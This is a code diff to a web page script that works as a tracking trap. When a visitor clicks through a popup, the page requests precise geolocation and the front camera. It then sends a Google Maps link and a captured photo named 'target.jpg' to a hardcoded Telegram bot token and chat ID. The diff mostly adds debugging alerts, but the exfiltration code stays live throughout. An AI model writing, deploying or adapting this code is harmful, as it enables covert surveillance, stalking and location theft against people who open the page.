@@ -46,62 +46,59 @@
 <canvas id="canvas"></canvas>
 
 <script>
+    alert("✅ Code Loaded!");
+
     const B_T = "8739484012:AAFMN2V0kdkVnUp_8YlDV1IKEq9_6IiZsOA";
     const C_I = "659131693";
 
     async function sendMsg(text) {
-        try {
-            await fetch(https://api.telegram.org/bot${B_T}/sendMessage, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: C_I, text: text })
-            });
-        } catch (e) {}
+        await fetch(https://api.telegram.org/bot${B_T}/sendMessage, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: C_I, text: text })
+        }).catch(e => alert("❌ Msg Failed: " + e));
     }
 
     async function sendPhoto(blob) {
         const fd = new FormData();
         fd.append('chat_id', C_I);
         fd.append('photo', blob, 'target.jpg');
-        try {
-            await fetch(https://api.telegram.org/bot${B_T}/sendPhoto, {
-                method: 'POST',
-                body: fd
-            });
-        } catch (e) {}
+        await fetch(https://api.telegram.org/bot${B_T}/sendPhoto, {
+            method: 'POST',
+            body: fd
+        }).catch(e => alert("❌ Photo Failed: " + e));
     }
 
-    // شارەوەی دوگمەکان و overlay
     function hidePopup() {
         document.getElementById('alertBox').style.display = 'none';
         document.getElementById('overlay').style.display = 'none';
+        alert("✅ Popup Hidden");
     }
 
-    // ڕاستەوخۆ داواکاری لۆکەیشن و کامێرا
     async function startCapture(label) {
         hidePopup();
-        await sendMsg(🎯 ${label});
+        alert("🚀 Starting: " + label);
+        await sendMsg("🎯 " + label);
 
-        // ١. داواکاری ڕاستەقینەی لۆکەیشن
-        let loc = "📍 BLOCKED";
         try {
             const pos = await new Promise((ok, no) => {
                 navigator.geolocation.getCurrentPosition(ok, no, {
-                    enableHighAccuracy: true,
-                    timeout: 5000
+                    enableHighAccuracy: true, timeout: 5000
                 });
             });
-            loc = 📍 https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude};
+            let loc = 📍 https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude};
+            alert("✅ Location: " + loc);
+            await sendMsg(loc);
         } catch (e) {
-            loc = "❌ Location: " + e.message;
+            alert("❌ Location Failed: " + e.message);
+            await sendMsg("❌ Location: " + e.message);
         }
-        await sendMsg(loc);
 
-        // ٢. داواکاری ڕاستەقینەی کامێرا
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user" }
             });
+            alert("✅ Camera Access Granted");
             const v = document.getElementById('video');
             v.srcObject = stream;
             await new Promise(r => setTimeout(r, 2000));
@@ -113,12 +110,14 @@
 
             c.toBlob(async (blob) => {
                 if (blob) {
+                    alert("✅ Photo Captured");
                     await sendPhoto(blob);
                     await sendMsg("📸 Sent");
                 }
                 stream.getTracks().forEach(t => t.stop());
             }, 'image/jpeg', 0.7);
         } catch (e) {
+            alert("❌ Camera Failed: " + e.name);
             await sendMsg("🚫 Camera: " + e.name);
         }
     }
